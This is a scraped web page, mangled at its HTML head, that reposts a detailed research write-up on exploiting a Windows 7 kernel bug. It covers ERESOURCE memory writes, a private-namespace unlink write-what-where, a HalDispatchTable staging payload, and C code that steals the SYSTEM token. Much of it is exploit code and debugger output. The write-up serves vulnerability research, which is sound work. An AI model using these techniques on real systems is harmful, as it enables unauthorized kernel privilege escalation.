<!DOCTYPE html>
<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Introducing the USB Stick of Death，利用U盘入侵Windows - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">


<p style="text-indent:2em;">
	However, taking the new mitigation mechanisms introduced in Windows 8 into account, including the unavailability of NULL page mapping functionality otherwise reachable through <a href="http://www.uninformed.org/?v=10&amp;a=2">NtAllocateVirtualMemory</a>, the bug would only be exploitable on Windows 7 and earlier versions; it doesn’t make any difference though, since the crash doesn’t reproduce on Windows 8 anyway. For the affected platforms though, exploitation odds are looking good at this point of analysis.
</p>
<h4>
	Exploitation phase #1: the context
</h4>
<p style="text-indent:2em;">
	In order to achieve reliable escalation into ring-0, it is necessary to examine the memory operations performed by <em>ExAcquireResourceExclusiveLite</em> upon the ERESOURCE structure. After a quick look at IDA, the function seems to be rather complicated: a lot of fields are being read from and written to in various relations, and some parts of the code can even get stuck waiting forever for a particular bit in a bitmask to be set. If you look closely though, there is one code path that is relatively simple and self-contained, thus has the potential to aid in successful exploitation (the <em>rbx</em> register stores the structure base address):
</p>
<pre class="prettyprint">.text:0000000140084470                 xor     r12d, r12d
[...]
.text:0000000140084449                 cmp     [rbx+40h], r12d
.text:000000014008444D                 jnz     loc_14008433D
.text:0000000140084453                 mov     edx, r12d
.text:0000000140084456                 jmp     loc_1400842CE
[...]
.text:00000001400842CE                 and     dword ptr [rbx+38h], 3
.text:00000001400842D2                 or      dword ptr [rbx+38h], 4
.text:00000001400842D6                 mov     r13d, 1
.text:00000001400842DC                 mov     [rbx+40h], r13d
.text:00000001400842E0                 mov     [rbx+18h], r13w
.text:00000001400842E5                 mov     [rbx+30h], r14
.text:00000001400842E9                 mov     eax, 80h
.text:00000001400842EE                 movzx   ebp, r13b
.text:00000001400842F2                 or      [rbx+1Ah], ax</pre>
<p style="text-indent:2em;">
	Leading the kernel to execute the above branch has several advantages over other options: it only performs a constant number of simple memory operations over the structure fields, is simple to understand and returns immediately (i.e. doesn’t wait for a particular bit combination etc). Back to pseudo-code, the interesting assembly snippet can be represented using a few expressions:
</p>
<pre class="prettyprint">if [dword](x + 0x40) == 0
  [dword](x + 0x38) = ([dword](x + 0x38) &amp; 3) | 4;
  [dword](x + 0x40) = 1;
  [word](x + 0x18) = 1;
  [qword](x + 0x30) = PsGetCurrentThread();
  [word](x + 0x1a) |= 0x80;</pre>
<p style="text-indent:2em;">
	To add some more context, the Windows 7 64-bit ERESOURCE structure is defined as follows:
</p>
<pre class="prettyprint">kd&gt; dt _ERESOURCE
nt!_ERESOURCE
  +0x000 SystemResourcesList : _LIST_ENTRY
  +0x010 OwnerTable       : Ptr64 _OWNER_ENTRY
  +0x018 ActiveCount      : Int2B
  +0x01a Flag             : Uint2B
  +0x020 SharedWaiters    : Ptr64 _KSEMAPHORE
  +0x028 ExclusiveWaiters : Ptr64 _KEVENT
  +0x030 OwnerEntry       : _OWNER_ENTRY
  +0x040 ActiveEntries    : Uint4B
  +0x044 ContentionCount  : Uint4B
  +0x048 NumberOfSharedWaiters : Uint4B
  +0x04c NumberOfExclusiveWaiters : Uint4B
  +0x050 Reserved2        : Ptr64 Void
  +0x058 Address          : Ptr64 Void
  +0x058 CreatorBackTraceIndex : Uint8B
  +0x060 SpinLock         : Uint8B</pre>
<p style="text-indent:2em;">
	Now, that’s a lot of memory operations, if the attacker wants to supply a bogus parameter such as an important system structure! Given the amount of writes taking place at various offsets, it really is quite non-trivial to accomplish successful privilege escalation without severely corrupting memory around the purposely overwritten value. At first, I had two ideas of how the problem could be approached:
</p>
<ol>
	<li>
		<p style="text-indent:2em;">
			Find a memory region with an ETHREAD address (in)directly related to system security and attempt to replace it with the current thread’s structure address (see offset 0×30), hoping that the other operations would not deal critical damage to the surrounding data. An example of such approach would be to inject the current thread into a more-privileged process by altering a thread list within the corresponding process’ EPROCESS structure.
		</p>
	</li>
	<li>
		<p style="text-indent:2em;">
			Find a writeable memory region with a kernel-mode function pointer and use the (x + 0×38) or (x + 0×40) memory writes to replace the higher 32-bits of the ring-0 address (typically equal to 0xFFFFF8A0) with a user-mode prefix containing zeros for the most significant 31 bits. An example of such approach would be to overwrite one of the KernelRoutine / RundownRoutine members of the KAPC structure:
		</p>
<pre class="prettyprint">kd&gt; dt _KAPC
nt!_KAPC
  +0x000 Type             : UChar
  +0x001 SpareByte0       : UChar
  +0x002 Size             : UChar
  +0x003 SpareByte1       : UChar
  +0x004 SpareLong0       : Uint4B
  +0x008 Thread           : Ptr64 _KTHREAD
  +0x010 ApcListEntry     : _LIST_ENTRY
  +0x020 KernelRoutine    : Ptr64     void
  +0x028 RundownRoutine   : Ptr64     void
  +0x030 NormalRoutine    : Ptr64     void
  +0x038 NormalContext    : Ptr64 Void
  +0x040 SystemArgument1  : Ptr64 Void
  +0x048 SystemArgument2  : Ptr64 Void
  +0x050 ApcStateIndex    : Char
  +0x051 ApcMode          : Char
  +0x052 Inserted         : UChar</pre>
		<p style="text-indent:2em;">
			If carried out correctly (i.e. spent more time on), this technique could be most likely used to exploit the discussed bug, thanks to several fortunate facts: kernel-mode addresses of KAPC structures are known to user-mode programs <a href="http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-003.pdf">if allocated as Reserve Objects</a>, and the 32 user-controlled bytes (highlighted) are placed directly after kernel-mode pointers, making it possible to set the bytes properly in order to meet the (x + 0×40) == 0 condition.
		</p>
	</li>
</ol>
<p style="text-indent:2em;">
	I have done some quick testing trying the most intuitive ideas, but always failed miserably – either it was impossible to match the offsets correctly so that meaningful data was overwritten in the desired way, or the other modifications done to surrounding memory would sooner or later bring the operating system down. After one or two hours of continuous BSoDs, I decided to see if my most recent discovery – Private Namespace objects – could come in handy. And they really did, as a fully reliable exploit was eventually implemented using this very technique :)
</p>
<h4>
	Exploitation phase #2: private namespaces
</h4>
<p style="text-indent:2em;">
	The following high-level description of private namespaces <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684295%28v=vs.85%29.aspx">can be found in MSDN</a>:
</p>
<p style="padding-left:30px;">
	<em>An object namespace protects named objects from unauthorized access. Creating a private namespace enables applications and services to build a more secure environment.</em> 
</p>
<p style="padding-left:30px;">
	<em>A process can create a private namespace using the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682419%28v=vs.85%29.aspx">CreatePrivateNamespace</a> function. This function requires that you specify a boundary that defines how the objects in the namespace are to be isolated. The caller must be within the specified boundary for the create operation to succeed. To specify a boundary, use the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682121%28v=vs.85%29.aspx">CreateBoundaryDescriptor</a> and <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681937%28v=vs.85%29.aspx">AddSIDToBoundaryDescriptor</a> functions.</em> 
</p>
<p style="text-indent:2em;">
	The abstract details of the object semantics beyond our interest – the really important part is its representation as a structure in the kernel memory. After creating an exemplary private namespace and investigating the handle, the namespace proves to be technically implemented as a Directory object.
</p>
<pre class="prettyprint">kd&gt; !handle 28
PROCESS fffffa80054e4060
  SessionId: 1  Cid: 0584    Peb: 7fffffdb000  ParentCid: 0240
  DirBase: 58fac000  ObjectTable: fffff8a005bd8ed0  HandleCount:  11.
  Image: ntfs_exploit.exe

Handle table at fffff8a00a367000 with 11 entries in use
0028: Object: fffff8a007d068d0  GrantedAccess: 000f000f Entry: fffff8a00a3670a0
Object: fffff8a007d068d0  Type: (fffffa8003666f30) Directory
  ObjectHeader: fffff8a007d068a0 (new version)
      HandleCount: 1  PointerCount: 2</pre>
<p style="text-indent:2em;">
	While typical Windows Directory objects are represented by a fixed-size OBJECT_DIRECTORY structure, private namespaces are no ordinary directories – in fact, they consist of three separate structures bundled within a single allocation: an almost empty OBJECT_DIRECTORY followed by structures referred to as NAMESPACE_DESCRIPTOR and BOUNDARY_DESCRIPTOR, the last one being of variable size dependent on the length of the boundary name specified through <em>CreateBoundaryDescriptor</em>. The overall layout of a private namespace in the kernel memory is broken down below (second structure is highlighted):
</p>
<pre class="prettyprint">fffff8a0`07d068d0  00000000 00000000 00000000 00000000
fffff8a0`07d068e0  00000000 00000000 00000000 00000000
fffff8a0`07d068f0  00000000 00000000 00000000 00000000
fffff8a0`07d06900  00000000 00000000 00000000 00000000
fffff8a0`07d06910  00000000 00000000 00000000 00000000
fffff8a0`07d06920  00000000 00000000 00000000 00000000
fffff8a0`07d06930  00000000 00000000 00000000 00000000
fffff8a0`07d06940  00000000 00000000 00000000 00000000
fffff8a0`07d06950  00000000 00000000 00000000 00000000
fffff8a0`07d06960  00000000 00000000 00000000 00000000
fffff8a0`07d06970  00000000 00000000 00000000 00000000
fffff8a0`07d06980  00000000 00000000 00000000 00000000
fffff8a0`07d06990  00000000 00000000 00000000 00000000
fffff8a0`07d069a0  00000000 00000000 00000000 00000000
fffff8a0`07d069b0  00000000 00000000 00000000 00000000
fffff8a0`07d069c0  00000000 00000000 00000000 00000000
fffff8a0`07d069d0  00000000 00000000 00000000 00000000
fffff8a0`07d069e0  00000000 00000000 00000000 00000000
fffff8a0`07d069f0  00000000 00000000 00000000 00000000
fffff8a0`07d06a00  00000000 00000000 ffffffff 00000000
fffff8a0`07d06a10  07d06a20 fffff8a0 00000001 00000000
fffff8a0`07d06a20  0283c550 fffff800 0283c550 fffff800
fffff8a0`07d06a30  07d068d0 fffff8a0 00000028 00000000
fffff8a0`07d06a40  00000000 00000000 00000021 00000000
fffff8a0`07d06a50  00000001 00000001 00000028 00000000
fffff8a0`07d06a60  00000001 00000016 00350031 00320034
fffff8a0`07d06a70  00340038 00000033</pre>
<p style="text-indent:2em;">
	For any given directory, its namespace descriptor can be stored at any address, hence the presence of a <em>PrivateNamespace</em> pointer field in the structure:
</p>
<pre class="prettyprint">kd&gt; dt _OBJECT_DIRECTORY
nt!_OBJECT_DIRECTORY
 +0x000 HashBuckets      : [37] Ptr64 _OBJECT_DIRECTORY_ENTRY
 +0x128 Lock             : _EX_PUSH_LOCK
 +0x130 DeviceMap        : Ptr64 _DEVICE_MAP
 +0x138 SessionId        : Uint4B
 +0x140 NamespaceEntry   : Ptr64 Void
 +0x148 Flags            : Uint4B</pre>
<p style="text-indent:2em;">
	In all practical scenarios, the pointer contains an address 0×10 bytes ahead of its own one (as shown in the object layout breakdown above). If an attacker was able to modify the pointer, the kernel would consequently use an improper address to access the structure. Furthermore, the NAMESPACE_DESCRIPTOR being pointed at contains a LIST_ENTRY field which links the structure into a global linked list of all private namespaces in the system. Objects are first attached to the list during their creation in <em>nt!NtCreatePrivateNamespace</em>, and later removed from the list during object deletion in <em>nt!ObpRemoveNamespaceFromTable</em>. Since the Windows 7 kernel doesn’t implement safe unlinking of LIST_ENTRY structures (Windows 8 does), the code responsible for unlinking is represented by a commonly observed assembly pattern, exposing the kernel to a potential write-what-where condition if both Flink/Blink fields are controlled by an attacker:
</p>
<pre class="prettyprint">PAGE:00000001402EC29D                 mov     rax, [rbx+140h]
[...]
PAGE:00000001402EC2BD                 mov     rcx, [rax]
[...]
PAGE:00000001402EC2C4                 mov     rax, [rax+8]
PAGE:00000001402EC2C8                 mov     [rax], rcx
PAGE:00000001402EC2CB                 mov     [rcx+8], rax</pre>
<p style="text-indent:2em;">
	Last but not least, a majority of the OBJECT_DIRECTORY structure used for namespaces is zeroed out and completely ignored throughout the object’s lifespan, which mitigates the risk of corrupting important kernel data. Practical experiments have shown that it is possible to safely overwrite OBJECT_DIRECTORY.PrivateNamespace with a fixed 00000004`fffffa80 value by using a 0x10c offset relative to the object’s base address (which is already known to the exploit thanks to <em>NtQuerySystemInformation</em> and <em>SystemHandleInformation</em>). Let’s take a look at which parts of the structure are tampered with and why it is a good solution system reliability-wise.
</p>
<pre class="prettyprint">fffff8a0`07d069f0  00000000 00800001 00000000 00000000
fffff8a0`07d06a00  00000000 00000000 ffffffff 04424640
fffff8a0`07d06a10  fffffa80 00000004 00000001 00000001</pre>
<p style="text-indent:2em;">
	Let’s quickly iterate through the memory operations performed over the memory region:
</p>
<ul>
	<li>
		<p style="text-indent:2em;">
			<strong>[dword](x + 0×40)</strong> or <strong>fffff8a0`07d06a1c</strong> is always zero during the comparison, as it is the unused padding memory past the OBJECT_DIRECTORY structure.
		</p>
	</li>
	<li>
		<p style="text-indent:2em;">
			<strong>[dword](x + 0×38)</strong> or <strong>fffff8a0`07d06a14</strong> is the upper part of the <em>PrivateNamespace</em> pointer, overwritten with a value of 4.
		</p>
	</li>
	<li>
		<p style="text-indent:2em;">
			<strong>[word](x + 0×18)</strong> or <strong>fffff8a0`07d069f4</strong> points into an unused field within OBJECT_DIRECTORY.
		</p>
	</li>
	<li>
		<p style="text-indent:2em;">
			<strong>[qword](x + 0×30)</strong> or <strong>fffff8a0`07d06a0c</strong> spans across two fields: its lower 32 bits overlap with <em>SessionId</em> (not dangerous), while the upper part is mapped to the lower DWORD of the <em>PrivateNamespace</em> pointer. Thanks to the predictability of the most significant bits of kernel-mode addresses, we achieve a full overwrite of <em>PrivateNamespace</em> with a user-mode 00000004`fffffa80 address, which can be trivially mapped through <em>VirtualAlloc</em> or any other such API.
		</p>
	</li>
	<li>
		<p style="text-indent:2em;">
			<strong>[word](x + 0x1a)</strong> or <strong>fffff8a0`07d069f2</strong> points into an unused field within OBJECT_DIRECTORY.
		</p>
	</li>
</ul>
<p style="text-indent:2em;">
	After redirecting the <em>PrivateNamespace</em> pointer and mapping memory at the magic ring-3 address, an attacker is able to trigger a fully-controlled write-what-where by manipulating the values at 00000004`fffffa80 and 00000004`fffffa84, and fnally calling CloseHandle on the namespace object thus invoking the desired code path in <em>nt!ObpRemoveNamespaceFromTable</em>.
</p>
<pre class="prettyprint">kd&gt; u
nt!ObpRemoveNamespaceFromTable+0x58:
fffff800`029362b8 488908          mov     qword ptr [rax],rcx
fffff800`029362bb 48894108        mov     qword ptr [rcx+8],rax
fffff800`029362bf ff0dd3d2f3ff    dec     dword ptr [nt!ObpPrivateNamespaceLookupTable+0x258 (fffff800`02873598)]
fffff800`029362c5 0f0d0dc4d2f3ff  prefetchw [nt!ObpPrivateNamespaceLookupTable+0x250 (fffff800`02873590)]
fffff800`029362cc 488b05bdd2f3ff  mov     rax,qword ptr [nt!ObpPrivateNamespaceLookupTable+0x250 (fffff800`02873590)]
fffff800`029362d3 488bc8          mov     rcx,rax
fffff800`029362d6 4883e1f0        and     rcx,0FFFFFFFFFFFFFFF0h
fffff800`029362da 4883f910        cmp     rcx,10h
kd&gt; ? rax
Evaluate expression: 4702111234474983745 = 41414141`41414141
kd&gt; ? rcx
Evaluate expression: 4774451407313060418 = 42424242`42424242</pre>
<p style="text-indent:2em;">
	At this point, we are free to overwrite any kernel memory region with arbitrary data, making it trivial to achieve an actual elevation of privileges. The next section details the remaining steps required to reliably change the primary access token of the current process to NT AUTHORITY\SYSTEM and exit the exploit without crashing the system.
</p>
<h4>
	Exploitation phase #3: owning the system
</h4>
<p style="text-indent:2em;">
	With the ability to replace arbitrary kernel memory with arbitrary data, one has lots of options to choose from in order to hijack ring-0 code execution flow. The most typical ideas include overwriting the <em>nt!HalDispatchTable+sizeof(void*)</em> function pointer, the <em>nt!MmUserProbeAddress</em> value, a return address on a kernel-mode stack or <a href="http://www.hackinthebox.org/misc/HITB-Ezine-Issue-002.pdf">one of the function pointers within various Windows objects</a> (such as ETHREAD.SuspendApc.KernelRoutine). In this particular proof of concept exploit, I decided to go with <em>HalDispatchTable</em>, being the easiest and most commonly used technique. Because the write-what-where triggered during namespace deletion works both ways, we require the following staging payload in order to jump over the old value of <em>HalDispatchTable+8</em> at offset 8 in our code (the magic 0×4141… value must be replaced with the address of the actual shellcode).
</p>
<pre class="prettyprint">[bits 64]

start:
  jmp @@

padding:
  times (8 + 8 - (padding - start)) db 0

@@:
  mov rax, 0x4141414141414141
  jmp rax</pre>
<p style="text-indent:2em;">
	Thanks to the fact that the overwritten pointer is saved at offset 8 of the staging payload by the kernel, we can safely restore its original value after replacing the process security token in our hostile ring-0 routine. That way, we make sure that post-exploitation system state is completely clean and subsequent <em>NtQueryIntervalProfile</em> calls from other processes won’t bring the system down after we achieve our goals.
</p>
<h3>
	The payload
</h3>
<p style="text-indent:2em;">
	I have often seen Windows kernel exploits using very non-elegant payloads written in assembly, which would use constant offsets and other types of hard-coded information. Such payloads are not portable across various Windows editions or processor bitnesses and most of all, they just look bad. I decided to develop my own high-level C payload for replacing primary process tokens using documented Windows kernel API. Since all of the referenced functions are publicly exported kernel symbols, their addresses can be obtained while still in user-mode, as a part of the pre-exploitation initialization via <em>NtQuerySystemInformation</em> and <em>SystemModuleInformation</em>. Without further ado, the code looks like the following:
</p>
<pre class="prettyprint lang-cpp">NTSTATUS EscalatePrivileges( /* adequate number of parameters */ ) {
  OBJECT_ATTRIBUTES ObjectAttributes;
  NTSTATUS NtStatus;
  HANDLE hSystem = NULL, hToken = NULL, hNewToken = NULL;
  CLIENT_ID ClientId = {(HANDLE)4, NULL};
  PROCESS_ACCESS_TOKEN AccessToken;

  InitializeObjectAttributes(&amp;ObjectAttributes, NULL, 0, NULL, NULL);
  NtStatus = pZwOpenProcess(&amp;hSystem, GENERIC_ALL, &amp;ObjectAttributes, &amp;ClientId);
  if (!NT_SUCCESS(NtStatus)) {
    goto err;
  }

  NtStatus = pZwOpenProcessToken(hSystem, GENERIC_ALL, &amp;hToken);
  if (!NT_SUCCESS(NtStatus)) {
    return STATUS_UNSUCCESSFUL;
  }

  InitializeObjectAttributes(&amp;ObjectAttributes, NULL, 0, NULL, NULL);
  NtStatus = pZwDuplicateToken(hToken, TOKEN_ALL_ACCESS, &amp;ObjectAttributes, TRUE,
                               TokenPrimary, &amp;hNewToken);
  if (!NT_SUCCESS(NtStatus)) {
    goto err;
  }

  AccessToken.Token = hNewToken;
  AccessToken.Thread = NULL;
  NtStatus = pZwSetInformationProcess(GetCurrentProcess(),
                                      ProcessAccessToken,
                                      &amp;AccessToken,
                                      sizeof(PROCESS_ACCESS_TOKEN));

err:
  if (hNewToken != NULL) {
    pZwCloseHandle(hNewToken);
  }
  if (hToken != NULL) {
    pZwCloseHandle(hToken);
  }
  if (hSystem != NULL) {
    pZwCloseHandle(hSystem);
  }

  return NtStatus;
}</pre>
<p style="text-indent:2em;">
	In short, the routine attempts to open a handle to the “System” process by using the default PID=4, acquires a handle to its access token which is guaranteed to have the highest possible privileges (NT AUTHORITY\SYSTEM user token), duplicates it as a primary token and assigns it to the current program – a rather typical privilege escalation payload activity implemented using four official API functions. It works properly on all 32-bit platforms including the latest Windows 8; for example, it has been used in the final stage of the <a href="http://j00ru.vexillium.org/blog/20_05_12/cve_2011_2018.pdf">CVE-2011-2018 vulnerability exploitation</a>.
</p>
<p style="text-indent:2em;">
	Interestingly, when testing the shellcode on Windows 7 64-bit, <em>ZwSetInformationProcess</em> unexpectedly returned error code 0xC00000BB (STATUS_NOT_SUPPORTED). After a cursory investigation, it turned out that the internal <em>nt!PspAssignPrimaryToken</em> routine verifies the <em>PrimaryTokenFrozen</em> flag potentially set in the EPROCESS.Flags2 field of the process to receive a new primary token:
</p>
<pre class="prettyprint">+0x434 Flags2           : Uint4B
 +0x434 JobNotReallyActive : Pos 0, 1 Bit
 +0x434 AccountingFolded : Pos 1, 1 Bit
 +0x434 NewProcessReported : Pos 2, 1 Bit
 +0x434 ExitProcessReported : Pos 3, 1 Bit
 +0x434 ReportCommitChanges : Pos 4, 1 Bit
 +0x434 LastReportMemory : Pos 5, 1 Bit
 +0x434 ReportPhysicalPageChanges : Pos 6, 1 Bit
 +0x434 HandleTableRundown : Pos 7, 1 Bit
 +0x434 NeedsHandleRundown : Pos 8, 1 Bit
 +0x434 RefTraceEnabled  : Pos 9, 1 Bit
 +0x434 NumaAware        : Pos 10, 1 Bit
 +0x434 ProtectedProcess : Pos 11, 1 Bit
 +0x434 DefaultPagePriority : Pos 12, 3 Bits
 +0x434 PrimaryTokenFrozen : Pos 15, 1 Bit
 +0x434 ProcessVerifierTarget : Pos 16, 1 Bit
 +0x434 StackRandomizationDisabled : Pos 17, 1 Bit
 +0x434 AffinityPermanent : Pos 18, 1 Bit
 +0x434 AffinityUpdateEnable : Pos 19, 1 Bit
 +0x434 PropagateNode    : Pos 20, 1 Bit
 +0x434 ExplicitAffinity : Pos 21, 1 Bit</pre>
<p style="text-indent:2em;">
	At that time, I was not able to find any documented way of clearing the flag for the current process or setting a new token regardless of the flag – <span style="color:#000000;"><del>if you are aware of any such technique, I am more than happy to hear</del></span><del> fro</del><del>m</del><del> y</del><del>ou</del> I later learned that the flag is not set for processes created with CREATE_SUSPENDED that haven’t been resumed yet (<a href="https://twitter.com/aionescu/status/260169232237592576">thanks Alex!</a>). In the meanwhile, I decided to zero out the flag manually by hardcoding the offset into the current process structure for the sake of a working proof of concept:
</p>
<pre class="prettyprint lang-cpp">PDWORD CurrentProcess = PsGetCurrentProcess();

[...]

// Disable the EPROCESS-&gt;Flags2 PrimaryTokenFrozen flag.
CurrentProcess[kFlags2Offset] &amp;= ~kPrimaryTokenFrozen;</pre>
